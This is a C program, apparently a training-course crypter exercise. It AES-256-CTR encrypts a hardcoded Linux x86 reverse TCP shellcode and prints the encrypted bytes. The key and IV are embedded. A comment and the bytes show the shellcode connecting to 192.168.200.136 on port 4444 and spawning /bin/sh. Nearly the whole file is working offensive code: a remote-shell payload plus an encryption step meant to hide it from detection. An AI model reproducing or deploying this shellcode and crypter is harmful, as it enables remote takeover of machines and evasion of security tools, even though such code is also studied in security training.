#include<stdio.h>
#include<stdlib.h>
#include<string.h>


#define CBC 1
#define CTR 1
#define ECB 1
#define AES256 1

#include "aes.h"

int i;
static void encrypt(void)
{
    // IV: mykeyishardtosee
    uint8_t iv[]  = { 
			0x6d, 0x79, 0x6b, 0x65, 0x79, 0x69, 0x73, 0x68, 0x61, 0x72, 0x64, 0x74, 0x6f, 0x73, 0x65, 0x65 
		    };

    // Key: spcuyijbsdgwtigfedymyxzamskucbmr
    uint8_t key[] = { 
			0x73, 0x70, 0x63, 0x75, 0x79, 0x69, 0x6a, 0x62, 0x73, 0x64, 0x67, 0x77, 0x74, 0x69, 0x67, 0x66,
			0x65, 0x64, 0x79, 0x6d, 0x79, 0x78, 0x7a, 0x61, 0x6d, 0x73, 0x6b, 0x75, 0x63, 0x62, 0x6d, 0x72 
		    };

    //Shellcode Reverse TCP connect to my ip 192.168.200.136 at port 4444
    uint8_t shellcode[] = { 

			 	0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0x31,0xf6,0x31,0xff,0x66,0xb8,0x67,0x01,0xb3,0x02,0xb1,0x01,0xcd,0x80,0x89,0xc6,0x89,0xc3,0xb1,0x03,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x49,0x79,0xf7,0x31,0xdb,0x89,0xf3,0x66,0xb8,0x6a,0x01,0x57,0x68,0xc0,0xa8,0xc8,0x88,0x66,0x68,0x11,0x5c,0x66,0x6a,0x02,0x89,0xe1,0xb2,0x66,0xcd,0x80,0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa
				
			  };

    struct AES_ctx ctx;

    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, shellcode, sizeof(shellcode));


    printf("Encrypted Shellcode Format 1:");
    printf("\n");

    for (i = 0; i < sizeof shellcode; i ++)
    {
        printf("\\x%02x", shellcode[i]);
    }

    printf("\n");

    printf("Encrypted Shellcode Format 2:");
    printf("\n");
	 
    for (i = 0; i < sizeof shellcode; i ++)
    {
	if(i == sizeof(shellcode)-1){
		printf("0x%02x", shellcode[i]);
	}else{
		printf("0x%02x,", shellcode[i]);
	}
    }
    
    printf("\n");
}

int main(void)
{
    encrypt();
}